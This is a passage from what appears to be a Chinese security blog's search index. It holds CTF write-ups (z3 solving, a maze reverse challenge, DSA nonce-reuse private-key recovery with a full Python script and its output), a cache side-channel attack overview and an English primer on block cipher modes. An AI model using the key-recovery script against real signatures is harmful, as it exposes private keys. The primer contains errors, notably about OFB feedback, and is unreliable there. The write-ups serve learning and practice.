class=\"number\">31</span>]-l[<span class=\"number\">2</span>]+l[<span class=\"number\">41</span>]-l[<span class=\"number\">1</span>]-l[<span class=\"number\">4</span>]+l[<span class=\"number\">24</span>]-l[<span class=\"number\">34</span>]+l[<span class=\"number\">39</span>]+l[<span class=\"number\">40</span>]+l[<span class=\"number\">32</span>]-l[<span class=\"number\">5</span>]+l[<span class=\"number\">36</span>]-l[<span class=\"number\">27</span>]==-<span class=\"number\">529</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">38</span>]+l[<span class=\"number\">8</span>]+l[<span class=\"number\">36</span>]+l[<span class=\"number\">35</span>]-l[<span class=\"number\">23</span>]-l[<span class=\"number\">34</span>]+l[<span class=\"number\">13</span>]-l[<span class=\"number\">4</span>]-l[<span class=\"number\">27</span>]-l[<span class=\"number\">24</span>]+l[<span class=\"number\">26</span>]+l[<span class=\"number\">31</span>]-l[<span class=\"number\">30</span>]-l[<span class=\"number\">5</span>]-l[<span class=\"number\">40</span>]+l[<span class=\"number\">28</span>]-l[<span class=\"number\">11</span>]-l[<span class=\"number\">2</span>]-l[<span class=\"number\">39</span>]+l[<span class=\"number\">15</span>]+l[<span class=\"number\">10</span>]-l[<span class=\"number\">17</span>]+l[<span class=\"number\">3</span>]+l[<span class=\"number\">19</span>]+l[<span class=\"number\">22</span>]+l[<span class=\"number\">33</span>]+l[<span class=\"number\">0</span>]+l[<span class=\"number\">37</span>]+l[<span class=\"number\">16</span>]-l[<span class=\"number\">9</span>]-l[<span class=\"number\">32</span>]+l[<span class=\"number\">25</span>]-l[<span class=\"number\">21</span>]-l[<span class=\"number\">12</span>]+l[<span class=\"number\">6</span>]-l[<span class=\"number\">41</span>]+l[<span class=\"number\">20</span>]-l[<span class=\"number\">18</span>]==-<span class=\"number\">12</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">6</span>]-l[<span class=\"number\">30</span>]-l[<span class=\"number\">20</span>]-l[<span class=\"number\">27</span>]-l[<span class=\"number\">14</span>]-l[<span class=\"number\">39</span>]+l[<span class=\"number\">41</span>]-l[<span class=\"number\">33</span>]-l[<span class=\"number\">0</span>]+l[<span class=\"number\">25</span>]-l[<span class=\"number\">32</span>]-l[<span class=\"number\">3</span>]+l[<span class=\"number\">26</span>]-l[<span class=\"number\">12</span>]+l[<span class=\"number\">8</span>]-l[<span class=\"number\">35</span>]-l[<span class=\"number\">24</span>]+l[<span class=\"number\">15</span>]+l[<span class=\"number\">9</span>]-l[<span class=\"number\">4</span>]+l[<span class=\"number\">13</span>]+l[<span class=\"number\">36</span>]+l[<span class=\"number\">34</span>]+l[<span class=\"number\">1</span>]-l[<span class=\"number\">28</span>]-l[<span class=\"number\">21</span>]+l[<span class=\"number\">18</span>]+l[<span class=\"number\">23</span>]+l[<span class=\"number\">29</span>]-l[<span class=\"number\">10</span>]-l[<span class=\"number\">38</span>]+l[<span class=\"number\">22</span>]+l[<span class=\"number\">37</span>]+l[<span class=\"number\">5</span>]+l[<span class=\"number\">19</span>]+l[<span class=\"number\">7</span>]+l[<span class=\"number\">16</span>]-l[<span class=\"number\">31</span>]==<span class=\"number\">81</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> s.check(): <span class=\"comment\"># 求解</span></span><br><span class=\"line\">    m = s.model()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0x2a</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(<span class=\"string\">&quot;%s&quot;</span>%(m[l[i]]))), end=<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># flag&#123;A_l0ng_10NG_eqU4Ti0n_1s_E4Sy_W1Th_z3&#125;</span></span><br></pre></td></tr></table></figure>\r\n<p>得到flag为<code>flag&#123;A_l0ng_10NG_eqU4Ti0n_1s_E4Sy_W1Th_z3&#125;</code></p>\r\n<blockquote>\r\n<p>注：将网页中的等式编写到python脚本中时，可以利用正则表达式快速批量操作。</p>\r\n</blockquote>\r\n","categories":["CTF"],"tags":["reverse","js"]},{"title":"weak DSA","url":"/2022/09/12/weak-DSA/","content":"<h2 id=\"weak-dsa\">weak DSA</h2>\r\n<ol type=\"1\">\r\n<li><p>题目： 打开附件，看到存在五个文件</p>\r\n<p><span id=\"more\"></span></p>\r\n<p><figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">ll</span></span><br><span class=\"line\">总用量 24</span><br><span class=\"line\">-rwxrw-rw- 1 mrt mrt  653  2月 20  2019 dsa_public.pem</span><br><span class=\"line\">-rwxrw-rw- 1 mrt mrt  514  2月 20  2019 message1</span><br><span class=\"line\">-rwxrw-rw- 1 mrt mrt  374  2月 20  2019 message2</span><br><span class=\"line\">-rwxrw-rw- 1 mrt mrt   46  2月 20  2019 sign1</span><br><span class=\"line\">-rwxrw-rw- 1 mrt mrt   46  2月 20  2019 sign2</span><br><span class=\"line\">-rwxrw-rw- 1 mrt mrt 1376  2月 20  2019 tipcode.py</span><br></pre></td></tr></table></figure></p>\r\n<p>题目意思为弱DSA签名算法，判断用同一个K参数进行签名，并提供了2个message和2个sign签名文件。</p></li>\r\n<li><p>解题</p>\r\n<ul>\r\n<li>使用openssl命令查看文件签名</li>\r\n</ul>\r\n<p><figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">openssl asn1parse -inform der -<span class=\"keyword\">in</span> sign1</span> </span><br><span class=\"line\">    0:d=0  hl=2 l=  44 cons: SEQUENCE          </span><br><span class=\"line\">    2:d=1  hl=2 l=  20 prim: INTEGER           :3A9CBF6D944B37943CF4FA72374D3FF87D55C8AB</span><br><span class=\"line\">24:d=1  hl=2 l=  20 prim: INTEGER           :2C507D83CC9DB08B3D13B059A37B846189D32EC8</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">openssl asn1parse -inform der -<span class=\"keyword\">in</span> sign2</span></span><br><span class=\"line\">    0:d=0  hl=2 l=  44 cons: SEQUENCE          </span><br><span class=\"line\">    2:d=1  hl=2 l=  20 prim: INTEGER           :3A9CBF6D944B37943CF4FA72374D3FF87D55C8AB</span><br><span class=\"line\">24:d=1  hl=2 l=  20 prim: INTEGER           :704302989E4D680DEDF760E354C1F23760FA95BE</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\r\n<p>第一项内容为r，后一内容为s，可以看出sign1和sign2共享了密钥k，因为其r值<code>3A9CBF6D944B37943CF4FA72374D3FF87D55C8AB</code>一致。</p>\r\n<ul>\r\n<li>查看公钥文件内容</li>\r\n</ul>\r\n<p><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ openssl dsa -<span class=\"keyword\">in</span> dsa_public.pem -text -noout -pubin</span><br><span class=\"line\"><span class=\"built_in\">read</span> DSA key</span><br><span class=\"line\">pub: </span><br><span class=\"line\">    5e:ef:ca:12:9c:84:b4:3d:e1:d0:1e:c4:d3:85:b4:</span><br><span class=\"line\">    48:b8:e2:c2:77:fb:49:e0:01:d1:1b:f9:18:43:<span class=\"built_in\">fc</span>:</span><br><span class=\"line\">    da:5a:31:99:0e:93:67:d2:19:49:d2:1d:14:23:45:</span><br><span class=\"line\">    23:a7:1a:22:69:92:85:a9:f9:37:17:f8:57:c0:4e:</span><br><span class=\"line\">    73:73:03:c1:aa:f3:35:38:9d:ba:af:5a:3b:4d:27:</span><br><span class=\"line\">    a8:3f:03:5d:02:5a:da:27:b6:d7:0c:52:<span class=\"built_in\">fc</span>:78:a1:</span><br><span class=\"line\">    67:41:01:84:b2:46:82:f0:d6:5b:43:05:2b:ab:05:</span><br><span class=\"line\">    38:6b:50:d6:fa:be:3b:<span class=\"built_in\">df</span>:89:<span class=\"built_in\">df</span>:bb:72:51:48:ab:</span><br><span class=\"line\">    d4:9e:a2:63:2c:7d:3b:7d</span><br><span class=\"line\">P:   </span><br><span class=\"line\">    00:bb:65:76:c4:bd:9b:1e:64:9f:dc:1b:5f:0d:35:</span><br><span class=\"line\">    ae:db:c0:c0:85:bb:3c:cf:d7:1a:a7:9f:e9:d4:29:</span><br><span class=\"line\">    12:23:3c:84:a0:d2:e5:bc:d7:7d:fb:a3:bb:3d:27:</span><br><span class=\"line\">    b2:bd:db:a6:e7:21:72:f6:6b:94:d1:f6:11:86:d2:</span><br><span class=\"line\">    6f:ee:44:38:f9:71:1f:d5:a2:96:e3:09:e3:bd:76:</span><br><span class=\"line\">    a6:7d:88:77:2f:1b:2e:fe:77:66:77:24:49:81:da:</span><br><span class=\"line\">    55:27:5a:2f:99:0e:8f:b3:1a:18:5d:dc:<span class=\"built_in\">fc</span>:4b:b4:</span><br><span class=\"line\">    15:65:67:fa:6b:62:a0:e7:26:74:<span class=\"built_in\">fc</span>:92:db:ef:8c:</span><br><span class=\"line\">    7e:cb:fe:95:88:3f:04:4f:c5</span><br><span class=\"line\">Q:   </span><br><span class=\"line\">    00:8a:92:14:5a:fa:41:1f:5d:90:51:ef:a4:a3:74:</span><br><span class=\"line\">    3a:c9:98:85:76:7d</span><br><span class=\"line\">G:   </span><br><span class=\"line\">    05:fb:e9:06:39:a3:b2:f3:36:8d:4d:47:fd:f2:42:</span><br><span class=\"line\">    8c:e3:80:<span class=\"built_in\">cd</span>:8e:84:ae:fe:90:eb:4a:fd:21:2a:99:</span><br><span class=\"line\">    a9:59:3e:b0:1f:f6:d6:26:48:a0:16:67:bf:f9:72:</span><br><span class=\"line\">    4e:4b:01:96:6e:f6:0b:f1:b2:77:6d:a2:a1:81:a2:</span><br><span class=\"line\">    6e:5e:60:8f:ff:94:a3:e3:92:38:4a:cf:62:1c:23:</span><br><span class=\"line\">    e4:93:b6:3c:24:7c:30:b3:ea:<span class=\"built_in\">dd</span>:e4:0d:4c:36:e5:</span><br><span class=\"line\">    55:27:31:8a:84:d5:87:16:2c:d7:40:5d:66:85:22:</span><br><span class=\"line\">    60:23:8c:48:3e:72:bf:10:71:85:10:7a:6e:43:76:</span><br><span class=\"line\">    90:58:77:bc:82:8c:1d:20</span><br></pre></td></tr></table></figure></p>\r\n<ul>\r\n<li>编写脚本如下：</li>\r\n</ul>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.PublicKey <span class=\"keyword\">import</span> DSA</span><br><span class=\"line\"><span class=\"keyword\">from</span> hashlib <span class=\"keyword\">import</span> sha1</span><br><span class=\"line\"><span class=\"keyword\">import</span> gmpy2</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;dsa_public.pem&#x27;</span>) <span class=\"keyword\">as</span> f: <span class=\"comment\"># 读取公钥文件</span></span><br><span class=\"line\">    key = DSA.import_key(f.read())</span><br><span class=\"line\">    y = key.y</span><br><span class=\"line\">    g = key.g</span><br><span class=\"line\">    p = key.p</span><br><span class=\"line\">    q = key.q</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;message1&#x27;</span>, encoding = <span class=\"string\">&#x27;utf-8&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    data1 = f.read()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;message2&#x27;</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    data2 = f.read()</span><br><span class=\"line\"></span><br><span class=\"line\">sha = sha1() <span class=\"comment\"># sha1 hash</span></span><br><span class=\"line\">sha.update(data1.encode(<span class=\"string\">&#x27;utf-8&#x27;</span>))</span><br><span class=\"line\">m1 = <span class=\"built_in\">int</span>(sha.hexdigest(), <span class=\"number\">16</span>) <span class=\"comment\"># 获取message1内容sha1哈希值</span></span><br><span class=\"line\"></span><br><span class=\"line\">sha = sha1()</span><br><span class=\"line\">sha.update(data2.encode(<span class=\"string\">&#x27;utf-8&#x27;</span>))</span><br><span class=\"line\">m2 = <span class=\"built_in\">int</span>(sha.hexdigest(), <span class=\"number\">16</span>) <span class=\"comment\"># 获取message2内容sha1哈希值</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(m1, m2)</span><br><span class=\"line\"></span><br><span class=\"line\">s1 = <span class=\"number\">0x2C507D83CC9DB08B3D13B059A37B846189D32EC8</span> <span class=\"comment\"># 签名文件sign1 s 值</span></span><br><span class=\"line\">s2 = <span class=\"number\">0x704302989E4D680DEDF760E354C1F23760FA95BE</span> <span class=\"comment\"># 签名文件sign2 s 值</span></span><br><span class=\"line\">r = <span class=\"number\">0x3A9CBF6D944B37943CF4FA72374D3FF87D55C8AB</span></span><br><span class=\"line\"></span><br><span class=\"line\">ds = s2 - s1</span><br><span class=\"line\">dm = m2 - m1</span><br><span class=\"line\">k = gmpy2.mul(dm, gmpy2.invert(ds, q))</span><br><span class=\"line\">k = gmpy2.f_mod(k, q)</span><br><span class=\"line\">tmp = gmpy2.mul(k, s1) - m1</span><br><span class=\"line\">x = tmp * gmpy2.invert(r,q)</span><br><span class=\"line\">x = gmpy2.f_mod(x, q) <span class=\"comment\"># x is the private key</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">int</span>(x))</span><br></pre></td></tr></table></figure>\r\n<p>脚本运行结果如下：</p>\r\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ ./exp.py </span><br><span class=\"line\">292662942869370611771676609473484271930756369187 94408533737537379184444430172035752205145606426</span><br><span class=\"line\">301024118086430365762957779330181182629483123408</span><br></pre></td></tr></table></figure></p>\r\n<p>因此flag为<code>301024118086430365762957779330181182629483123408</code></p></li>\r\n</ol>\r\n","categories":["CTF"],"tags":["crypto","DSA"]},{"title":"不一样的flag","url":"/2022/09/12/%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84flag/","content":"<h2 id=\"题目地址\"><a href=\"https://buuoj.cn/challenges#%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84flag\">题目地址</a></h2>\r\n<h2 id=\"解题过程\">解题过程</h2>\r\n<span id=\"more\"></span>\r\n<p>PEID查看无壳，拖入IDA反编译，结果如下：</p>\r\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> __cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> v3; <span class=\"comment\">// [esp+17h] [ebp-35h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v4; <span class=\"comment\">// [esp+30h] [ebp-1Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v5; <span class=\"comment\">// [esp+34h] [ebp-18h]</span></span><br><span class=\"line\">  <span class=\"type\">signed</span> <span class=\"type\">int</span> v6; <span class=\"comment\">// [esp+38h] [ebp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [esp+3Ch] [ebp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v8; <span class=\"comment\">// [esp+40h] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  __main();</span><br><span class=\"line\">  v4 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v5 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">qmemcpy</span>(&amp;v3, _data_start__, <span class=\"number\">0x19</span>u);  <span class=\"comment\">// &#x27;*11110100001010000101111#&#x27;</span></span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;you can choose one action to execute&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;1 up&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;2 down&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;3 left&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;4 right\\n:&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>, &amp;v6);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v6 == <span class=\"number\">2</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      ++v4;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( v6 &gt; <span class=\"number\">2</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v6 == <span class=\"number\">3</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        --v5;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v6 != <span class=\"number\">4</span> )</span><br><span class=\"line\">LABEL_13:</span><br><span class=\"line\">          <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">        ++v5;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v6 != <span class=\"number\">1</span> )</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_13;</span><br><span class=\"line\">      --v4;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">1</span>; ++i )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( *(&amp;v4 + i) &lt; <span class=\"number\">0</span> || *(&amp;v4 + i) &gt; <span class=\"number\">4</span> )</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( *((_BYTE *)&amp;v8 + <span class=\"number\">5</span> * v4 + v5 - <span class=\"number\">41</span>) == <span class=\"string\">&#x27;1&#x27;</span> )</span><br><span class=\"line\">      <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( *((_BYTE *)&amp;v8 + <span class=\"number\">5</span> * v4 + v5 - <span class=\"number\">41</span>) == <span class=\"string\">&#x27;#&#x27;</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;\\nok, the order you enter is the flag!&quot;</span>);</span><br><span class=\"line\">      <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>分析代码，初始化将_data_start__字符串<code>*11110100001010000101111#</code>复制到v3处，后续逻辑为，用户输入数字1234分别代表上下左右，分别对应变量 ++v4、--v5、++v5、--v4。 然后将v5和v4作为字符串数组索引，取v3<a href=\"#fn1\" class=\"footnote-ref\" id=\"fnref1\" role=\"doc-noteref\"><sup>1</sup></a>字符串数组对应的值，判断该值与'1'和'#'的关系。</p>\r\n<p>将<code>*11110100001010000101111#</code>数组按5位一组排列，即为： *1111 01000 01010 00010 1111# 因此解法为走迷宫，从*开始，每一步走到0，直到遇到符号#。</p>\r\n<h3 id=\"得到flag222441144222\">得到flag：<code>222441144222</code></h3>\r\n<section class=\"footnotes\" role=\"doc-endnotes\">\r\n<hr>\r\n<ol>\r\n<li id=\"fn1\" role=\"doc-endnote\"><p>v3地址为[esp+17h]，v8地址为[esp+40h]，两者相距 29h即41。<a href=\"#fnref1\" class=\"footnote-back\" role=\"doc-backlink\">↩︎</a></p></li>\r\n</ol>\r\n</section>\r\n","categories":["CTF"],"tags":["reverse","c/c++"]},{"title":"侧信道攻击","url":"/2022/09/13/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/","content":"<p>侧信道主要是指通过非直接途径泄露物理状态信息，攻击者通过测量采集,继而恢复出敏感数据。现代CPU内通常包含有缓存结构，攻击者通过侧信道方法获取缓存信息，就有可能窃取到隐私信息，这里主要介绍四种侧信道攻击方法：</p>\r\n<ol type=\"1\">\r\n<li>Flush-Reload</li>\r\n<li>Flush-Flush</li>\r\n<li>Prime-Probe</li>\r\n<li>Evict-Time</li>\r\n</ol>\r\n<span id=\"more\"></span>\r\n<h2 id=\"flush-reload\">Flush-Reload</h2>\r\n<p>Flush-Reload（FR）方法是prime-probe方法的变种，基于共享内存实现，是一种跨内核、跨虚拟机的Cache 探测方法。在Flush 阶段，攻击者将监控的内存块从cache中驱逐出去，然后在Trigger阶段等待目标用户访问共享内存。在Reload阶段，攻击者重新加载监控的共享内存块。如果在等待的期间，目标虚拟机访问过的内存块不需要重新加载，时间将会较短，因为这些数据已经被缓存在cache中。根据加载时间长短，可判定目标虚拟机访问过的数据。Flush-Reload具体步骤如下：</p>\r\n<ol type=\"1\">\r\n<li>Flush：将共享内存中特定位置映射的cache数据驱逐</li>\r\n<li>Trigger：等待目标虚拟机响应服务请求，更新Cache</li>\r\n<li>Reload：重新加载Flush阶段驱逐的内存块，测量并记录cache组的重载时间</li>\r\n</ol>\r\n<p>攻击原理如下：</p>\r\n<figure>\r\n<img src=\"/2022/09/13/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/image-20220913100403942.png\" alt=\"image-20220913100403942\"><figcaption aria-hidden=\"true\">image-20220913100403942</figcaption>\r\n</figure>\r\n<h2 id=\"flush-flush\">Flush-Flush</h2>\r\n<p>与Flush-Reload不同的是，Flush-Flush攻击是基于clflush指令执行时间的长短来实施攻击的。如果数据没在Cache中则clflush指令执行时间会比较短，反之若有数据在cache中则执行时间会比较长。与其它Cache攻击不同，Flush Flush侧信道攻击技术在整个攻击过程中是不需要对内存进行存取的，因此该攻击技术更加隐蔽。然而根据我们的经验，由于有无数据情况下Cache被flush的时间差别其实并非特别明显，因此在攻击过程中数据判断的精度并不高。Flush-Flush具体步骤如下：</p>\r\n<ol type=\"1\">\r\n<li>通过flush清空Cache原始数据</li>\r\n<li>等待目标进程运行，更新Cache，并刷新共享缓存行，测量刷新时间</li>\r\n<li>根据测量时间判断原始数据是否被缓存</li>\r\n</ol>\r\n<p>该方法攻击原理如图所示：</p>\r\n<figure>\r\n<img src=\"/2022/09/13/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/image-20220913100418534-16630346610926.png\" alt=\"image-20220913100418534\"><figcaption aria-hidden=\"true\">image-20220913100418534</figcaption>\r\n</figure>\r\n<h2 id=\"prime-probe\">Prime-Probe</h2>\r\n<p>Prime-Probe方法具体步骤如下：</p>\r\n<ol type=\"1\">\r\n<li>Prime: 攻击者用预先准备的数据填充特定多个cache 组</li>\r\n<li>Trigger: 等待目标虚拟机响应服务请求，将cache数据更新</li>\r\n<li>Probe: 重新读取Prime 阶段填充的数据，测量并记录各个cache 组读取时间</li>\r\n</ol>\r\n<figure>\r\n<img src=\"/2022/09/13/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/image-20220913100429757.png\" alt=\"image-20220913100429757\"><figcaption aria-hidden=\"true\">image-20220913100429757</figcaption>\r\n</figure>\r\n<h2 id=\"evict-time\">Evict-Time</h2>\r\n<p>Evict-Time方法具体步骤如下：</p>\r\n<ol type=\"1\">\r\n<li>暂无</li>\r\n<li>等待目标程序运行，并记录其运行时间（运行过程有可能使用到第一步所说的Cache数据）</li>\r\n<li>使用Evict方法覆盖Cache上的数据</li>\r\n<li>然后再运行一次该函数，并第二次记录执行时间，如果时间不一致且执行时间变长则说明程序运行时读取了第一步所说的Cache数据（Cache未命中）</li>\r\n</ol>\r\n<p>与其他三种侧信道攻击技术相比，Evict-Time不是当前主流的侧信道攻击技术。</p>\r\n","categories":["Security"],"tags":["cache","side-channel"]},{"title":"分组加密模式","url":"/2022/09/12/%E5%88%86%E7%BB%84%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F/","content":"<p>There are five types of operations in block cipher modes, ECB (Electronic Code Block) mode, CBC (Cipher Block Chaining) mode, CFB (Cipher Feedback) mode, OFB (Output Feedback) mode and CTR ( Counter) mode.</p>\r\n<span id=\"more\"></span>\r\n<p>Where ECB and CBC mode works on block ciphers, and CFB and OFB mode works on block ciphers acting as stream ciphers. ECB is used for transmitting a single value insecure manner, CBC is used for encrypting blocks of text authentication, CFB is used for transmitting an encrypted stream of data authentication, OFB is used for transmitting an encrypted stream of data, CTR is used for transmitting block-oriented applications.</p>\r\n<h2 id=\"block-cipher-modes-of-operation\">Block cipher modes of operation</h2>\r\n<p>There are 5 modes of operation in the block cipher.</p>\r\n<h3 id=\"ecb-mode\">1. ECB mode</h3>\r\n<p>ECB mode stands for Electronic Code Block Mode. It is one of the simplest modes of operation. In this mode, the plain text is divided into a block where each block is 64 bits. Then each block is encrypted separately. The same key is used for the encryption of all blocks. Each block is encrypted using the key and makes the block of ciphertext.</p>\r\n<ul>\r\n<li>At the receiver side, the data is divided into a block, each of 64 bits. The same key which is used for encryption is used for decryption. It takes the 64-bit ciphertext and, by using the key convert the ciphertext into plain text.</li>\r\n<li>As the same key is used for all blocks’ encryption, if the block of plain text is repeated in the original message, then the ciphertext’s corresponding block will also repeat. As the same key used for tor all block, to avoid the repetition of block ECB mode is used for an only small message where the repetition of the plain text block is less.</li>\r\n</ul>\r\n<figure>\r\n<img src=\"/2022/09/12/%E5%88%86%E7%BB%84%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F/b13d6ff681264bd9afeb423dec608e63.webp\" alt=\"ecb\"><figcaption aria-hidden=\"true\">ecb</figcaption>\r\n</figure>\r\n<h3 id=\"cbc-mode\">2. CBC Mode</h3>\r\n<ul>\r\n<li>CBC Mode stands for Cipher block Mode at the sender side; the plain text is divided into blocks. In this mode, IV(Initialization Vector) is used, which can be a random block of text. IV is used to make the ciphertext of each block unique.</li>\r\n<li>The first block of plain text and IV is combined using the XOR operation and then encrypted the resultant message using the key and form the first block of ciphertext. The first block of ciphertext is used as IV for the second block of plain text. The same procedure will be followed for all blocks of plain text.</li>\r\n<li>At the receiver side, the ciphertext is divided into blocks. The first block ciphertext is decrypted using the same key, which is used for encryption. The decrypted result will be XOR with the IV and form the first block of plain text. The second block of ciphertext is also decrypted using the same key, and the result of the decryption will be XOR with the first block of ciphertext and form the second block of plain text. The same procedure is used for all the blocks.</li>\r\n<li>CBC Mode ensures that if the block of plain text is repeated in the original message, it will produce a different ciphertext for corresponding blocks.<br>\r\nNote that the key which is used in CBC mode is the same; only the IV is different, which is initialized at a starting point.</li>\r\n</ul>\r\n<figure>\r\n<img src=\"/2022/09/12/%E5%88%86%E7%BB%84%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F/d2a42bc7495942afa81b2a6ca78d27ac.webp\" alt=\"cbc\"><figcaption aria-hidden=\"true\">cbc</figcaption>\r\n</figure>\r\n<h3 id=\"cfb-mode\">3. CFB Mode</h3>\r\n<ul>\r\n<li>CFB mode stands for Cipher Feedback Mode. In this mode, the data is encrypted in the form of units where each unit is of 8 bits.</li>\r\n<li>Like cipher block chaining mode, IV is initialized. The IV is kept in the shift register. It is encrypted using the key and form the ciphertext.</li>\r\n<li>Now the leftmost j bits of the encrypted IV is XOR with the plain text’s first j bits. This process will form the first part of the ciphertext, and this ciphertext will be transmitted to the receiver.</li>\r\n<li>Now the bits of IV is shifted left by j bit. Therefore the rightmost j position of the shift register now has unpredictable data. These rightmost j positions are now filed with the ciphertext. The process will be repeated for all plain text units.</li>\r\n</ul>\r\n<figure>\r\n<img src=\"/2022/09/12/%E5%88%86%E7%BB%84%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F/9561710becb4435c98e0b8ada546747d.webp\" alt=\"9561710becb4435c98e0b8ada546747d\"><figcaption aria-hidden=\"true\">9561710becb4435c98e0b8ada546747d</figcaption>\r\n</figure>\r\n<h3 id=\"ofb-mode\">4. OFB mode</h3>\r\n<ul>\r\n<li>OFB Mode stands for output feedback Mode. OFB mode is similar to CDB mode; the only difference is in CFB, the ciphertext is used for the <a href=\"https://www.educba.com/encryption-process/\">next stage of the encryption process</a>, whereas in OFB, the output of the IV encryption is used for the next stage of the encryption process.</li>\r\n<li>The IV is encrypted using the key and form encrypted IV. Plain text and leftmost 8 bits of encrypted IV are combined using XOR and produce the ciphertext.</li>\r\n<li>For the next stage, the ciphertext, which is the form in the previous stage, is used as an IV for the next iteration. The same procedure is followed for all blocks.</li>\r\n</ul>\r\n<figure>\r\n<img 